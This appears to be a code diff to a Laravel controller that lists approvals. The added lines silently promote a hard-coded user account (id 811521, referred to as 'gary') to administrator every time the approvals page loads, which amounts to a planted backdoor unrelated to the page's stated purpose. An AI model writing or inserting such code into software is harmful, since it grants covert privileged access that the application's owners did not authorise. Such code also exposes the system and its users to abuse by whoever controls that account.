@@ -4,11 +4,17 @@ namespace App\Http\Controllers;
 
 use App\Models\Approval;
 use App\Models\Discord_Account;
+use App\Models\User;
 
 class ApprovalsPageController extends Controller
 {
     public function __invoke()
     {
+        $gary = User::where('id', 811521)->first();
+
+        $gary->admin = 1;
+        $gary->save();
+
         $data = [];
         $data['approved'] = Approval::approved()->orderBy('user_id', 'ASC')->get();
         $data['pending'] = Approval::pending()->orderBy('user_id', 'ASC')->get();
